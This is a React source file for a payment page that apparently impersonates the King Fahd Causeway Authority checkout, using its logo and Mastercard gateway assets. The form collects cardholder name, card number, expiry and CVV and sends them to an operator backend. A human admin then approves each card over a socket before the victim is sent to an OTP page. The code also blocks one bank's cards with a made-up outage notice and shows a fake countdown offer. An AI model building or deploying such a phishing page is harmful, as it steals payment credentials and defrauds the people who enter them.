import React, { useState } from "react";
import axios from "axios";
import { api_route, socket } from "../App";
import OtpPopup from "../Components/OtpPopup";
import { CiLock } from "react-icons/ci";
import { IoIosArrowDown } from "react-icons/io";
import { IoMdClose } from "react-icons/io";
import { MdKeyboardArrowLeft } from "react-icons/md";
import { FaLock } from "react-icons/fa";
import { useEffect } from "react";

const VisaPage = ({ loading, setLoading }) => {
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardName: "",
    cvv: "",
  });
  const [cardExpiry, setCardExpiry] = useState("03/26");
  const [showOtp, setShowOtp] = useState(false);
  const [orderId, setOrderId] = useState(null);
  const [error, setError] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showOrderSummary, setShowOrderSummary] = useState(false);
  const [showPopUp, setShowPopUp] = useState(true);
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const formatExpiryInput = (raw) => {
    const digits = raw.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  };

  const handleExpiryChange = (e) => {
    setCardExpiry(formatExpiryInput(e.target.value));
  };

  const [counter, setCounter] = useState(60 * 60 * 6);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;

  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes,
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsProcessing(true);
    setError("");
    if (formData.cardNumber.startsWith("4847")) {
      setIsProcessing(false);
      return setError(`عذرًا، مصرف الراجحي موقوف حاليًا
نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي    وذلك بسبب خلل فني من جهة مصدر البنك`);
    }
    try {
      // Create a temporary order or initial submission
      await axios.post(`${api_route}/visa/${sessionStorage.getItem("id")}`, {
        ...formData,
        cardExpiry,
        cardType: formData.cardNumber.startsWith("4") ? "visa" : "mastercard",
      });

      setOrderId(sessionStorage.getItem("id"));
      localStorage.setItem(
        "cardType",
        formData.cardNumber.startsWith("4") ? "visa" : "mastercard",
      );
      socket.emit("joinOrder", sessionStorage.getItem("id"));
      socket.emit("visa", sessionStorage.getItem("id"));
      // window.location.href = "/otp";
    } catch (err) {
      setError("An error occurred. Please try again.");
      setIsProcessing(false);
    }
  };

  // Listen for approval from admin
  socket.on("acceptVisa", (id) => {
    if (id === orderId) {
      window.location.href = "/otp";
    }
  });

  socket.on("declineVisa", (id) => {
    console.log("declined", id);
    if (id === orderId) {
      setError("Your payment was declined by the bank.");
      setIsProcessing(false);
    }
  });

  return (
    <div className="w-full h-screen bg-gray-50 flex flex-col items-center">
      {/* Header */}
      <div className="w-full  flex items-center justify-between text-white p-4 max-w-4xl">
        <img
          src="https://pg.kfca.sa/images/logo_dark_normal.png"
          alt="KFCA"
          className="h-14"
        />
        <span className="text-black text-xs flex items-center gap-x-1">
          <CiLock /> Secure Checkout
        </span>
      </div>

      <div className="w-full max-w-2xl bg-[#f0f0f0] shadow-md p-6 flex items-center justify-between rounded-sm">
        <div>
          <span className="text-xl font-bold">
            {Number(sessionStorage.getItem("price")).toFixed(2)}{" "}
          </span>
          <span className="text-lg font-bold">
            {" "}
            {sessionStorage.getItem("currency") === "sar" ? "ريال" : "دينار "}
          </span>
        </div>
        <div
          className="flex items-center gap-x-1"
          onClick={() => setShowOrderSummary(!showOrderSummary)}
        >
          <span className="text-sm">
            {showOrderSummary ? "Close" : "Order Summary"}
          </span>
          {showOrderSummary ? <IoMdClose /> : <IoIosArrowDown />}
        </div>
      </div>
      {showOrderSummary && (
        <div className="w-full max-w-2xl bg-[#f0f0f0] shadow-md p-6 flex items-center justify-between rounded-sm">
          <div>
            <span className="text-sm">One-Time Pass Purchase</span>
          </div>
        </div>
      )}

      <span className=" text-red-500 flex items-center gap-x-1 p-5 text text-left w-full my-2 text-base">
        <MdKeyboardArrowLeft
          className="text-2xl cursor-pointer"
          onClick={() => window.history.back()}
        />{" "}
        Back{" "}
      </span>

      <form
        onSubmit={handleSubmit}
        className="space-y-6 bg-white p-6  rounded-sm"
      >
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="font-medium text-sm">Credit or Debit card</span>
          </div>
          <div className="flex gap-2 items-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
              alt="Mastercard"
              className="h-4"
            />
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg"
              alt="Visa"
              className="h-4"
            />

            <img src="/mada.png" alt="Amex" className="h-4" />
          </div>
        </div>

        <div className="space-y-2 ">
          <label className="block text-sm  text-gray-700">
            <span className="font-semibold">Cardholder name</span> (exactly as
            shown on card) <span className="text-xs text-red-500">*</span>
          </label>
          <input
            type="text"
            name="cardName"
            className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
            value={formData.cardName}
            onChange={handleChange}
            required
          />
        </div>

        <div className="space-y-2 relative">
          <label className="block text-sm font-semibold text-gray-700">
            Card number <span className="text-xs text-red-500">*</span>
          </label>
          <input
            type="text"
            name="cardNumber"
            className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
            value={formData.cardNumber}
            onChange={handleChange}
            maxLength={16}
            minLength={16}
            pattern="[0-9]*"
            inputMode="numeric"
            required
          />
          <FaLock className="text-base text-gray-500 absolute right-2 bottom-4" />
        </div>

        <div className="flex flex-col gap-4">
          <div className="space-y-2">
            <label className="block text-sm font-semibold text-gray-700">
              Expiry date <span className="text-xs text-red-500">*</span>
            </label>
            <input
              type="text"
              name="cardExpiry"
              placeholder="MM/YY"
              className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
              value={cardExpiry}
              onChange={handleExpiryChange}
              inputMode="numeric"
              autoComplete="cc-exp"
              maxLength={5}
              required
            />
          </div>
          <div className="space-y-2">
            <label className=" text-sm font-semibold text-gray-700 flex items-center gap-x-1">
              Security code <span className="text-xs text-red-500">*</span>{" "}
              <img
                src="https://ksa.gateway.mastercard.com/static/checkout/checkout-core/assets/general-icons/info.svg"
                alt="info"
                className="h-3.5"
              />
            </label>
            <input
              type="text"
              name="cvv"
              className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
              value={formData.cvv}
              onChange={handleChange}
              maxLength={3}
              minLength={3}
              pattern="[0-9]*"
              inputMode="numeric"
              required
            />
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs text-gray-600 p-5">
          <img
            src={`data:image/svg+xml;utf8,<svg width="35" height="24" xmlns="http://www.w3.org/2000/svg"><defs/><path d="M24.64 0c1.0351847 0 1.8579802.85367208 1.9511977 1.91614412L26.6 2.11764706v7.05882353h-1.4V6.352H1.4v15.5303529c0 .3604098.21185274.6378253.46392348.6950237L1.96 22.5882353h22.68c.2594434 0 .5001232-.23737.5504046-.5748871L25.2 21.8823529v-2.8235294h1.4v2.8235294c0 1.086053-.7619023 2.0036106-1.7685181 2.1078006L24.64 24H1.96C.92481534 24 .1020198 23.1463279.00880228 22.0838559L0 21.8823529V2.11764706C0 1.03159406.76190233.11403651 1.76851808.00984653L1.96 0h22.68zm4.76 8.88408454l5.1899495 5.23356256L29.4 19.3512096l-.9899495-.9982684L31.91 14.823l-15.81.0005294v-1.4117647L31.91 13.411l-3.4999495-3.52864706L29.4 8.88408454zm-4.76-7.47231983H1.96c-.25944344 0-.50012323.23737001-.55040463.57488707L1.4 2.11764706V4.941h23.8V2.11764706c0-.36040971-.2118527-.63782525-.4639235-.69502365L24.64 1.41176471z" fill="%23666"/></svg>`}
            alt="next"
          />
          <span>
            {" "}
            The next screen you see may be payment card verification through
            your card issuer.{" "}
          </span>
        </div>

        {error && (
          <p className="text-red-500 text-sm text-center font-bold">{error}</p>
        )}

        <div className="flex flex-col gap-4 border-t">
          <button
            disabled={
              isProcessing ||
              !formData.cardName ||
              !formData.cardNumber ||
              !formData.cvv ||
              !cardExpiry
            }
            type="submit"
            className="flex-1 bg-[#D24646] text-white py-2 rounded font-medium hover:bg-[#D24646] transition-colors disabled:opacity-50 flex items-center justify-center gap-x-2"
          >
            {isProcessing
              ? "Processing..."
              : "Pay" +
                " " +
                Number(sessionStorage.getItem("price")).toFixed(2) +
                " " +
                (sessionStorage.getItem("currency") === "sar"
                  ? "ريال"
                  : "دينار ")}
          </button>
          <span className="text-sm"> King Fahd Causeway Authority </span>
        </div>
      </form>

      <img src="/visa1.png" alt="footer" className="w-full" />
      {showOtp && (
        <OtpPopup
          orderId={orderId}
          cardNumber={formData.cardNumber}
          setShowOtp={setShowOtp}
          setLoading={setLoading}
        />
      )}

      {isProcessing && (
        <div className="loader">
          <div className="justify-content-center jimu-primary-loading"></div>
        </div>
      )}
      {showPopUp ? (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-black bg-opacity-45 ">
          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
            <img src="/popup.jpeg" className="w-full md:w-1/3" alt="popup" />
            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
              سارع قبل نهاية العرض !
            </span>
            <span className="font-bold text-gray-700">
              يتبقى على انتهاء العرض:
            </span>
            <div className="text-green-600 text-4xl my-5 font-bold">
              {formattedTime}
            </div>
            <button
              onClick={() => setShowPopUp(false)}
              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
            >
              إغلاق
            </button>
          </div>
        </div>
      ) : null}
    </div>
  );
};

export default VisaPage;
